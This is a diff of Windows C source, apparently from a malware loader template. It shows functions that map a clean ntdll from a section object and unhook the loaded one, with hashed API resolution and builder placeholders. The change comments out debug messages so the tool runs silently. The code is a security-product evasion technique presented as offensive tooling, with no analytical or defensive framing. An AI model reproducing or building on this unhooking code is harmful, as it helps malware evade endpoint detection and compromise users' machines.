@@ -78,7 +78,7 @@ LPVOID MapNtdll() {
     HANDLE hSection;
     NTSTATUS status1 = NtOpenSection(&hSection, SECTION_MAP_READ | SECTION_MAP_EXECUTE, &ObAt);
     if (!NT_SUCCESS(status1)) {
-        printf("[!] Failed in NtOpenSection (%u)\n", GetLastError());
+        //printf("[!] Failed in NtOpenSection (%u)\n", GetLastError());
         return NULL;
     }
 
@@ -88,7 +88,7 @@ LPVOID MapNtdll() {
     MyNtMapViewOfSection pNtMapViewOfSection = (MyNtMapViewOfSection)(GetProcAddressH(GetModuleHandleH(#-NTDLL_VALUE-#), #-NTMVOS_VALUE-#));
     NTSTATUS status2 = pNtMapViewOfSection(hSection, NtCurrentProcess(), &pntdll, 0, 0, NULL, &ViewSize, 1, 0, PAGE_READONLY);
     if (!NT_SUCCESS(status2)) {
-        printf("[!] Failed in NtMapViewOfSection (%u)\n", GetLastError());
+        //printf("[!] Failed in NtMapViewOfSection (%u)\n", GetLastError());
         getchar();
         return NULL;
     }
@@ -102,7 +102,7 @@ BOOL Unhook(LPVOID module) {
     PIMAGE_DOS_HEADER DOSheader = (PIMAGE_DOS_HEADER)module;
     PIMAGE_NT_HEADERS NTheader = (PIMAGE_NT_HEADERS)((char*)(module)+DOSheader->e_lfanew);
     if (!NTheader) {
-        printf(" [-] Not a PE file\n");
+        //printf(" [-] Not a PE file\n");
         return FALSE;
     }
 
